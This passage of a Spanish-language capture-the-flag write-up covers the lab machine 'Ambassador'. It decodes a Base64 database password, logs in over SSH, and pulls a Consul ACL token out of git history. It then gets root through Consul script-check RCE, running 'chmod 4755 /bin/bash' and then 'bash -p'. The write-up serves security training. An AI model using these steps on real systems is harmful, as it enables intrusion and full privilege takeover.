| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| user  | varchar(255) | YES  |     | NULL    |       |
| pass  | varchar(255) | YES  |     | NULL    |       |
+-------+--------------+------+-----+---------+-------+
2 rows in set (0,11 sec)

mysql&gt; select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
1 row in set (0,11 sec)
</code></pre></div><p>Parece una contraseña codificada en Base64:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | <span class="code-dark-green">base64</span> -d  
anEnglishManInNewYork027468
</code></pre></div><p>Esta vez, es una <a target="_blank" href="https://www.youtube.com/watch?v=d27gtrppayk">canción de Sting, el líder de The Police</a>. De todos modos, esta fue la contraseña mencionada por la publicación del <em>blog</em> al principio, por lo que tenemos acceso por SSH como <code>developer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> developer@10.10.11.183
developer@10.10.11.183's password:
<span class="code-green">developer@ambassador</span>:<span class="code-blue">~</span>$ cat user.txt  
58ffbf48bc8ea27324e379860cf8c5cc
</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Podemos ver que hay muchos puertos abiertos internamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">~</span>$ netstat -nat | grep LISTEN
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               <span class="code-red">LISTEN</span>  
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               <span class="code-red">LISTEN</span>
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               <span class="code-red">LISTEN</span>
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               <span class="code-red">LISTEN</span>
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               <span class="code-red">LISTEN</span>
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               <span class="code-red">LISTEN</span>
tcp        0      0 127.0.0.53:53           0.0.0.0:*               <span class="code-red">LISTEN</span>
tcp        0      0 0.0.0.0:22              0.0.0.0:*               <span class="code-red">LISTEN</span>
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               <span class="code-red">LISTEN</span>
tcp6       0      0 :::80                   :::*                    <span class="code-red">LISTEN</span>
tcp6       0      0 :::22                   :::*                    <span class="code-red">LISTEN</span>
tcp6       0      0 :::3000                 :::*                    <span class="code-red">LISTEN</span>
</code></pre></div><p>Podemos echar un vistazo a <code>/proc/net/tcp</code> para ver el UID que ejecuta el proceso que escucha en esos puertos TCP:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">~</span>$ cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode
   0: 0100007F:8124 00000000:0000 0A 00000000:00000000 00:00000000 00000000   114        0 37703 1 0000000000000000 100 0 0 10 0
   1: 00000000:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   114        0 37705 1 0000000000000000 100 0 0 10 0
   2: 0100007F:206C 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37944 1 0000000000000000 100 0 0 10 0
   3: 0100007F:206D 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37946 1 0000000000000000 100 0 0 10 0
   4: 0100007F:206E 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37667 1 0000000000000000 100 0 0 10 0
   5: 0100007F:2134 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37962 1 0000000000000000 100 0 0 10 0
   6: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 35809 1 0000000000000000 100 0 0 10 0
   7: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 36734 1 0000000000000000 100 0 0 10 0
   8: 0100007F:2198 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 37960 1 0000000000000000 100 0 0 10 0
   9: 0100007F:A85B 0100007F:206C 01 00000000:00000000 02:00000146 00000000     0        0 37672 2 0000000000000000 20 4 28 10 -1
  10: B70B0A0A:CBEE 140E0A0A:115C 01 00000000:00000000 00:00000000 00000000     0        0 158001 1 0000000000000000 21 4 29 10 -1  
  11: 0100007F:97D5 0100007F:206C 01 00000000:00000000 02:00000466 00000000     0        0 37673 2 0000000000000000 20 4 1 10 -1
  12: B70B0A0A:0016 2C110A0A:D8D1 01 00000024:00000000 01:00000024 00000000     0        0 213929 4 0000000000000000 36 4 31 10 46
  13: 0100007F:206C 0100007F:A85B 01 00000000:00000000 02:00000146 00000000     0        0 37676 2 0000000000000000 20 4 27 10 -1
  14: B70B0A0A:E29C 08080808:0035 02 00000001:00000000 01:0000010A 00000002   101        0 216094 2 0000000000000000 400 0 0 1 7
  15: 0100007F:206C 0100007F:97D5 01 00000000:00000000 02:00000466 00000000     0        0 37675 2 0000000000000000 20 4 0 10 -1
</code></pre></div><p>Es UID <code>0</code> para la mayoría de los puertos, por lo que los procesos se ejecutan como <code>root</code>. Podemos intentar conectarnos a algunos de ellos y vemos que el puerto 8500 responde:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">~</span>$ curl 127.0.0.1:8500; echo
Consul Agent: UI disabled. To enable, set ui_config.enabled=true in the agent configuration and restart.  
</code></pre></div><p>Vemos que está ejecutando <code>consul</code>. Podemos verificar que se ejecute como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">~</span>$ ps -faux | grep root | grep consul
root        1107  0.3  3.9 797876 79008 ?        Ssl  Oct18   4:16 /usr/bin/<span class="code-red">consul</span> agent -config-dir=/etc/<span class="code-red">consul</span>.d/config.d -config-file=/etc/<span class="code-red">consul</span>.d/<span class="code-red">consul</span>.hcl  
</code></pre></div><p>Ahí está. De hecho, tenemos permisos en <code>/etc/consul.d/config.d</code> como miembro del grupo <code>developer</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">~</span>$ ls -l /etc/consul.d/
total 16
drwx-wx--- 2 root   developer 4096 Sep 14 11:00 <span class="code-blue">config.d</span>
-rw-r--r-- 1 consul consul       0 Feb 28  2022 consul.env  
-rw-r--r-- 1 consul consul    5303 Mar 14  2022 consul.hcl
-rw-r--r-- 1 consul consul     160 Mar 15  2022 README
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Después de leer algo de documentación, encontramos algunos problemas de seguridad cuando <code>enable_script_checks</code> está configurado en <code>true</code> (más información <a target="_blank" href="https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations">aquí</a>). De hecho, tenemos esta situación:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">~</span>$ grep -vE '^#|^$' /etc/consul.d/consul.hcl  
data_dir = "/opt/consul"
server = true
bind_addr = "127.0.0.1"
bootstrap_expect=1
acl {
  enabled        = true
  default_policy = "deny"
  down_policy    = "extend-cache"
}
enable_script_checks = true
</code></pre></div><p>Esto nos permite obtener ejecución de código remoto en <code>cónsul</code>. Este <a target="_blank" href="https://github.com/owalid/consul-rce">repositorio de GitHub</a> tiene una herramienta que automatiza el proceso, pero necesitamos un <em>token</em> de autenticación.</p><h3 id="enumeración-de-git">Enumeración de Git</h3><p>Echando un vistazo nuevamente a la configuración de <code>consul</code>, vemos que <code>data_dir = "/opt/consul"</code>, así que veamos qué hay dentro de <code>/opt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">~</span>$ ls -la /opt
total 16
drwxr-xr-x  4 root   root   4096 Sep  1 22:13 <span class="code-blue">.</span>
drwxr-xr-x 20 root   root   4096 Sep 15 17:24 <span class="code-blue">..</span>
drwxr-xr-x  6 consul consul 4096 Oct 19 11:47 <span class="code-blue">consul</span>
drwxrwxr-x  5 root   root   4096 Mar 13  2022 <span class="code-blue">my-app</span>
<span class="code-green">developer@ambassador</span>:<span class="code-blue">~</span>$ cd /opt/my-app/
<span class="code-green">developer@ambassador</span>:<span class="code-blue">/opt/my-app</span>$ ls -la
total 24
drwxrwxr-x 5 root root 4096 Mar 13  2022 <span class="code-blue">.</span>
drwxr-xr-x 4 root root 4096 Sep  1 22:13 <span class="code-blue">..</span>
drwxrwxr-x 4 root root 4096 Mar 13  2022 <span class="code-blue">env</span>
drwxrwxr-x 8 root root 4096 Mar 14  2022 <span class="code-blue">.git</span>
-rw-rw-r-- 1 root root 1838 Mar 13  2022 .gitignore
drwxrwxr-x 3 root root 4096 Mar 13  2022 <span class="code-blue">whackywidget</span>  
</code></pre></div><p>Hay un repositorio de Git, vamos a enumerarlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">/opt/my-app</span>$ git log
<span class="code-dark-yellow">commit 33a53ef9a207976d5ceceddc41a199558843bf3c (<span class="code-cyan">HEAD -&gt; </span><span class="code-green">main</span>)</span>
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

<span class="code-dark-yellow">commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55</span>
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

<span class="code-dark-yellow">commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6</span>
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 22:47:01 2022 +0000

    created project with django CLI

<span class="code-dark-yellow">commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51</span>
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 22:44:11 2022 +0000

    .gitignore
<span class="code-green">developer@ambassador</span>:<span class="code-blue">/opt/my-app</span>$ git show c982db
<span class="code-dark-yellow">commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55</span>
Author: Developer &lt;developer@ambassador.local&gt;
Date:   Sun Mar 13 23:44:45 2022 +0000

    config script

<span class="code-white">diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh</span>
<span class="code-white">new file mode 100755</span>
<span class="code-white">index 0000000..35c08f6</span>
<span class="code-white">--- /dev/null</span>
<span class="code-white">+++ b/whackywidget/put-config-in-consul.sh</span>
<span class="code-dark-cyan">@@ -0,0 +1,4 @@</span>
<span class="code-dark-green">+# We use Consul for application config in production, this script will help set the correct values for the app</span>  
<span class="code-dark-green">+# Export MYSQL_PASSWORD before running</span>
<span class="code-dark-green">+</span>
<span class="code-dark-green">+consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD</span>
<span class="code-green">developer@ambassador</span>:<span class="code-blue">/opt/my-app</span>$ cat whackywidget/put-config-in-consul.sh
# We use Consul for application config in production, this script will help set the correct values for the app
# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running

consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
</code></pre></div><p>Y parece que hubo un <em>commit</em> antiguo con el <em>token</em> de autenticación <em>hard-coded</em> en un archivo, y ahora lo tenemos.</p><h3 id="reenvío-de-puertos">Reenvío de puertos</h3><p>Para conectarnos al puerto interno 8500 desde el exterior utilizando <a target="_blank" href="https://github.com/owalid/consul-rce">consul-rce</a>, necesitamos reenviar el puerto, podemos hacerlo en SSH (<code>ENTER + ~C</code> para obtener el interfaz <code>ssh></code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">/opt/my-app</span>$
<span class="code-green">developer@ambassador</span>:<span class="code-blue">/opt/my-app</span>$ ~C  
ssh&gt; -L 8500:127.0.0.1:8500
Forwarding port.

<span class="code-green">developer@ambassador</span>:<span class="code-blue">/opt/my-app</span>$
</code></pre></div><p>Ahora podemos obtener RCE. Por ejemplo, modificamos <code>/bin/bash</code> para que sea un binario SUID:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">/opt/my-app</span>$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 <span class="code-green">/bin/bash</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">consul_rce.py</span> -th 127.0.0.1 -tp 8500 -ct bb03b43b-1d81-d62b-24b5-39540ee469b5 -c <span class="code-dark-yellow">'chmod 4755 /bin/bash'</span>  
[+] Check byatdhvfeiktmga created successfully
[+] Check byatdhvfeiktmga deregistered successfully
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">/opt/my-app</span>$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 <span class="code-white code-bg-red">/bin/bash</span>  
</code></pre></div><p>Ahí está! Ahora podemos conseguir una <em>shell</em> como <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">developer@ambassador</span>:<span class="code-blue">/opt/my-app</span>$ bash -p  
bash-5.0# cat /root/root.txt
237bd60d163238f5794c2a9620def8c1
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#lectura-de-archivos-del-servidor">Lectura de archivos del servidor</a></li><li><a href="#conexión-a-mysql">Conexión a MySQL</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#enumeración-de-git">Enumeración de Git</a></li><li><a href="#reenvío-de-puertos">Reenvío de puertos</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>